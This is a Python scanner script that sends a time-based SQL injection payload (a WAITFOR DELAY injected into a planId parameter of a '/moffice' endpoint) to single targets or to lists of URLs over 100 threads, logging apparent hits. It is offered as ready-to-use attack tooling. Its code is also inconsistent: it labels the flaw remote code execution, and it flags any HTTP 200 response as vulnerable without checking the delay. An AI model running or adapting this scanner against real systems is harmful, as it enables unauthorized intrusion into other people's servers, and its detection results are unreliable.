import requests, sys, argparse, time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
                    
                    ██╗  ██╗███████╗██████╗  ██████╗ ███╗   ██╗ ██████╗ 
                    ██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔════╝ 
                    █████╔╝ █████╗  ██████╔╝██║   ██║██╔██╗ ██║██║  ███╗
                    ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║██║╚██╗██║██║   ██║
                    ██║  ██╗███████╗██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝
                    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝                                                                       
                                                                         author:秋妤
                                                                         time:2024.9.16
                                                                         version:1.0
"""
    print(banner)


def poc(target):
    payload = "/moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:5'--&sid=1"
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/x',
    }

    try:
        res = requests.get(url=url, headers=headers, verify=False, timeout=15)
        if res.status_code == 200:
            print(f"[+]{target}存在漏洞\n")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + " ：请手动检验是否存在漏洞\n")
        else:
            print(f"[-]{target}不存在漏洞")
    except:
        print(f"[*]该url存在问题")


def main():
    banner()
    parser = argparse.ArgumentParser(description='OfficeWeb365 远程代码执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

if __name__ == '__main__':
    main()